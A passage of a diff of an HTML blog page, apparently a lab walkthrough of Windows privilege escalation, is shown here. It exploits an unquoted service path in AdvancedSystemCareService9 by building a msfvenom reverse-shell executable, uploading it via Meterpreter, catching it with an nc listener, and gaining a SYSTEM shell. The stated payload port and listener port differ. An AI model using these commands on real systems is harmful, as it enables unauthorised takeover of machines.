+</span></span><span style="display:flex;"><span>AbuseFunction                   : Install-ServiceBinary -Name &#39;LiveUpdateSvc&#39;
+</span></span><span style="display:flex;"><span>CanRestart                      : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking service permissions...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking %PATH% for potentially hijackable DLL locations...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for AlwaysInstallElevated registry key...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for Autologon credentials in registry...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for modifidable registry autoruns and configs...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for modifiable schtask files/configs...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for unattended install files...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for encrypted web.config strings...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for encrypted application pool and virtual directory passwords...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for cached Group Policy Preferences .xml files....
+</span></span></code></pre></div><p>Looking at the output we can see a few services and binaries that could allow us to elevate our permissions, however there is one key service (AdvancedSystemCareService9) that looks more promising compared to the rest because:</p>
 <ol>
 <li>It is vulnerable to a Unquoted Service Path flaw <code>Path : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</code></li>
 <li>We can restart the service <code>CanRestart : True</code></li>
@@ -542,39 +542,39 @@ CanRestart                      : False
 <li>Restart the AdvancedSystemCareService9 service</li>
 </ul>
 <p>We can use msfvenom to generate the executable payload.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.7.19 LPORT=1337 -e x86/shikata_ga_nai -f exe -o Advanced.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-x86/shikata_ga_nai chosen with final size 351
-Payload size: 351 bytes
-Final size of exe file: 73802 bytes
-Saved as: Advanced.exe
-</code></pre></div><p>Now we can upload it to the server using our Meterpreter session.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">meterpreter &gt; cd &#39;C:\Program Files (x86)\IObit\&#39;
-meterpreter &gt; upload Advanced.exe
-[*] uploading  : Advanced.exe -&gt; Advanced.exe
-[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): Advanced.exe -&gt; Advanced.exe
-[*] uploaded   : Advanced.exe -&gt; Advanced.exe
-meterpreter &gt;
-</code></pre></div><p>We can start a new listener on our host to catch the reverse shell</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">nc -vnlp 1338
-Listening on [0.0.0.0] (family 0, port 1338)
-</code></pre></div><p>To trigger the vulnerability and get our shell we need to restart the service.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">meterpreter &gt; powershell_shell
-PS&gt; Restart-Service AdvancedSystemCareService9
-PS&gt;
-</code></pre></div><p>Going back to our listener we can see that we have received a connection from the host, using <code>whoami</code> we can see that we have a remote shell running with <code>nt authority\system</code> privileges.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Connection from 10.10.29.151 49400 received!
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt;whoami
-whoami
-nt authority\system
-</code></pre></div><p>Result! We now have full control of the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.7.19 LPORT=1337 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+</span></span><span style="display:flex;"><span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span>[-] No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>Found 1 compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size 351
+</span></span><span style="display:flex;"><span>Payload size: 351 bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: 73802 bytes
+</span></span><span style="display:flex;"><span>Saved as: Advanced.exe
+</span></span></code></pre></div><p>Now we can upload it to the server using our Meterpreter session.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd &#39;C:\Program Files (x86)\IObit\&#39;
+</span></span><span style="display:flex;"><span>meterpreter &gt; upload Advanced.exe
+</span></span><span style="display:flex;"><span>[*] uploading  : Advanced.exe -&gt; Advanced.exe
+</span></span><span style="display:flex;"><span>[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): Advanced.exe -&gt; Advanced.exe
+</span></span><span style="display:flex;"><span>[*] uploaded   : Advanced.exe -&gt; Advanced.exe
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><p>We can start a new listener on our host to catch the reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nc -vnlp 1338
+</span></span><span style="display:flex;"><span>Listening on [0.0.0.0] (family 0, port 1338)
+</span></span></code></pre></div><p>To trigger the vulnerability and get our shell we need to restart the service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; powershell_shell
+</span></span><span style="display:flex;"><span>PS&gt; Restart-Service AdvancedSystemCareService9
+</span></span><span style="display:flex;"><span>PS&gt;
+</span></span></code></pre></div><p>Going back to our listener we can see that we have received a connection from the host, using <code>whoami</code> we can see that we have a remote shell running with <code>nt authority\system</code> privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Connection from 10.10.29.151 49400 received!
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 6.3.9600]
+</span></span><span style="display:flex;"><span>(c) 2013 Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Result! We now have full control of the server.</p>
 
     </div>
     <div class="post-footer">
